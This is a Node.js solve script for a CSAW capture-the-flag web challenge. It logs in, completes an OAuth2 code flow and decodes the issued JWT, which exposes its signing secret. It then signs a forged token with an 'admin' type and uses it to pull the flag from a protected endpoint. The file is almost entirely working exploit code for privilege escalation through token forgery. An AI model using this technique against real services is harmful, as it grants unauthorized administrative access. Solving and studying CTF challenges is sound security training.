const supertest = require('supertest');
const jwt = require('jsonwebtoken');
const qs = require('querystring');

const URL = 'http://web.chal.csaw.io:9000';
// const URL = 'http://localhost:8000';
const request = supertest(URL);
const sessioned = supertest.agent(URL);

async function solve() {
  var store = {};
  // make a post request to login and grab cookie
  await sessioned
    .post('/login')
    .send({ username: 'a', password: 'a' })
    .type('form');

    // then grab auth code

    await sessioned
    .post('/oauth2/authorize')
    .send({ client_id: 1, redirect_uri: 'http://a.com', response_type: 'code'})
    .type('form')
    .then(data => {
      const { location } = data.res.headers;

      const [_, dat] = location.split('?');

      const { code } = qs.parse(dat);

      store.code = code;
    });

  // Then grab access token

  await request
    .post('/oauth2/token')
    .send({ client_id: 1, redirect_uri: 'http://a.com', grant_type: 'authorization_code', code: store.code })
    .type('form')
    .then(data => {
      const { text } = data.res;
      const { token } = JSON.parse(text);
      const  t = jwt.decode(token);
      console.log(t);
      store.secret = t.secret;
    });

  // Read token to get the secret out

  // re-encode token with new secret and set type=admin

  await new Promise((resolve, reject) => {
    jwt.sign({ type: 'admin' }, store.secret, (err, token) => {
      if (err) return reject(err);
      store.token = token;
      return resolve();
    })
  });

  // make request to protected to retrieve flag
  await request
    .get('/protected')
    .set('Authorization', `Bearer ${store.token}`)
    .then(data => {
      console.log(data.res.text);
    });


}

solve().then(() => console.log(""));

// request.get('/protected')
//   .set('Authorization', `Bearer yeet`)
//   .then(console.log);